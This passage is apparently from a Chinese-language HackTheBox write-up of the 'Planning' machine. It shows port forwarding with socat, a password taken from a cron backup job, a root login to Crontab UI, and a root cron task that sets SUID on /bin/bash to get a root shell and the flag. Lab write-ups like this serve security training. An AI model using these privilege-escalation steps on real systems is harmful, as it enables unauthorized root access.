-\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e注意到很多只有本机开放的端口，3000 是 Grafana，\u003ccode\u003e8000\u003c/code\u003e 不清楚\u003c/p\u003e\n\u003cp\u003e将 \u003ccode\u003e8000\u003c/code\u003e端口转发出去\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eenzo@planning:/tmp$ ./socat TCP-LISTEN:8001,fork tcp4:127.0.0.1:8000 \u0026#x26;\n[1] 2124\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e需要账号密码，\u003ccode\u003eenzo\u003c/code\u003e的凭据不正确\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Planning/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e回到 enzo 中再寻找一下信息\u003c/p\u003e\n\u003cp\u003e在 \u003ccode\u003e/opt/crontabs\u003c/code\u003e 找到 \u003ccode\u003ecrontab.db\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eenzo@planning:/opt/crontabs$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e crontab.db \n{\u003cspan class=\"hljs-string\"\u003e\"name\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"Grafana backup\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"command\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar \u0026#x26;\u0026#x26; /usr/bin/gzip /var/backups/grafana.tar \u0026#x26;\u0026#x26; zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz \u0026#x26;\u0026#x26; rm /var/backups/grafana.tar.gz\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"schedule\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"@daily\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"stopped\"\u003c/span\u003e:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"timestamp\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"logging\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"false\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"mailing\"\u003c/span\u003e:{},\u003cspan class=\"hljs-string\"\u003e\"created\"\u003c/span\u003e:1740774983276,\u003cspan class=\"hljs-string\"\u003e\"saved\"\u003c/span\u003e:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"_id\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"GTI22PpoJNtRKg0W\"\u003c/span\u003e}\n{\u003cspan class=\"hljs-string\"\u003e\"name\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"Cleanup\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"command\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"/root/scripts/cleanup.sh\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"schedule\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"* * * * *\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"stopped\"\u003c/span\u003e:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"timestamp\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"logging\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"false\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"mailing\"\u003c/span\u003e:{},\u003cspan class=\"hljs-string\"\u003e\"created\"\u003c/span\u003e:1740849309992,\u003cspan class=\"hljs-string\"\u003e\"saved\"\u003c/span\u003e:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"_id\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"gNIRXh1WIc9K7BYX\"\u003c/span\u003e}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这些是计划任务\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-comment\"\u003e# Grafana Docker 镜像备份，每天 00:00 执行\u003c/span\u003e\n0 0 * * * root /usr/bin/docker save root_grafana -o /var/backups/grafana.tar \\\n  \u0026#x26;\u0026#x26; /usr/bin/gzip /var/backups/grafana.tar \\\n  \u0026#x26;\u0026#x26; zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz \\\n  \u0026#x26;\u0026#x26; \u003cspan class=\"hljs-built_in\"\u003erm\u003c/span\u003e /var/backups/grafana.tar.gz\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-comment\"\u003e# 每分钟运行一次清理脚本\u003c/span\u003e\n* * * * * root /root/scripts/cleanup.sh\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e其中 \u003ccode\u003eGrafana Docker\u003c/code\u003e 计划任务中能得到一个密码 \u003ccode\u003eP4ssw0rdS0pRi0T3c\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e我们到 \u003ccode\u003eWeb\u003c/code\u003e 上尝试使用该密码进行登录，最后使用 \u003ccode\u003eroot:P4ssw0rdS0pRi0T3c\u003c/code\u003e 成功进入后台\u003c/p\u003e\n\u003ch3\u003eCrontab 提权\u003c/h3\u003e\n\u003cp\u003e后台是 \u003ccode\u003eCrontab UI\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Planning/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们看到上面的计划任务是以 \u003ccode\u003eroot\u003c/code\u003e 执行的，然后我们可以在这里新建计划任务（这里方法很多了，随便 root）\u003c/p\u003e\n\u003cp\u003e直接进行反弹 \u003ccode\u003eshell\u003c/code\u003e （失败）\u003c/p\u003e\n\u003cp\u003e给 \u003ccode\u003e/bin/bash\u003c/code\u003e 设置 \u003ccode\u003esid\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Planning/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e获取 Root\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eenzo@planning:/opt/crontabs$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al /bin/bash\n-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash\nenzo@planning:/opt/crontabs$ /bin/bash -p\nbash-5.2# \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=1000(enzo) gid=1000(enzo) euid=0(root) \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e=1000(enzo)\nbash-5.2# \u003cspan class=\"hljs-built_in\"\u003ecd\u003c/span\u003e /root\nbash-5.2# \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\nroot.txt  scripts\nbash-5.2# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e root.txt \n4f1ad996a454ef10623bfb578c0134ba\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e打的糊里糊涂的，并不算难。但是凭据放在 \u003cstrong\u003eMachine Information\u003c/strong\u003e 里面我是真想不到…\u003c/p\u003e\n\u003cp\u003e每个点都感觉没有串联起来，割裂感严重。\u003c/p\u003e","title":"HackTheBox - Machine - Planning","date":"2025-05-11","updated":"2025-09-20","tags":["HackTheBox","Linux靶机","Grafana","Crontab"],"categories":"靶机","comments":true,"description":"Machine - Planning\n\n https://app.hackthebox.com/machines/Planning | `Esay`\n \n\n前期踩点\n\n\n\n\n\n\n\n收集到一个邮箱 `info@planning.htb`\n\n\n\nWeb 渗透\n\n信息收集\n\n访问 `HTTP` 服务，采集指纹\n\n\n\n可能有用的三个用户名 `Bob Moss` `Rose Mary` `Stella Ha..."},"recentPosts":[{"id":"HackMyVMBirdeye","title":"HackMyVM - Birdeye","date":"2025-10-17","isEncrypted":false,"year":"2025","month":"10","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Machine - Certificate","date":"2025-06-02","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason9 - Imagery","title":"HackTheBox - Season9 - Imagery","date":"2025-10-04","isEncrypted":true,"year":"2025","month":"10","day":"04"},{"id":"TheHackersLabsTortuga","title":"TheHackersLabs - Tortuga","date":"2025-10-01","isEncrypted":false,"year":"2025","month":"10","day":"01"},{"id":"TheHackersLabsElevator","title":"TheHackersLabs - Elevator","date":"2025-09-29","isEncrypted":false,"year":"2025","month":"09","day":"29"}]},"__N_SSG":true},"page":"/[year]/[month]/[day]/[id]","query":{"year":"2025","month":"09","day":"20","id":"HackTheBoxMachine - Planning"},"buildId":"QF_69xfpA3_zMvnMTdy4T","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>